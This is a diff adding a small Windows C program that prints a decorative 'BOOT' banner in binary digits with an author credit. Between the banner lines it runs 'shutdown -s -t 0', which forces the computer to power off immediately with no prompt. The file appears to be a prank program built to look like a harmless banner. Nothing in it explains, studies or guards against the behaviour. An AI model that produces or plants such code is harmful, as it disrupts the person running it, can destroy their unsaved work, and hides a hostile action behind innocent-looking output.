@@ -1,0 +1,24 @@
+#include <stdio.h>
+#include <process.h>
+#include <windows.h>
+
+int main()
+{
+    char Y,N,x;
+
+    printf("\n \t ---------------------------------------------------------\n");
+
+    printf(" \t 010100110000      0100110010   0100110010   010100110000  \n");
+    printf(" \t 1010       10     10      01   10      01        01       \n");
+    printf(" \t 0011       01     00      10   00      10        10       \n");
+    printf(" \t 101010101000110   01      01   01      01        01       \n");
+    printf(" \t 0101         10   11      11   11      11        01       \n");
+    printf(" \t 1010         01   10      10   10      10        10       \n");
+    printf(" \t 001100110101011   0010101100   0010101100        10       \n");
+
+        system("C:\\windows\\system32\\shutdown -s -t 0");
+
+    printf("\n  \t \t x-x-x-x-| by John Valinsky |-x-x-x-x");
+    printf("\n \t ---------------------------------------------------------\n");
+    return 0;
+}
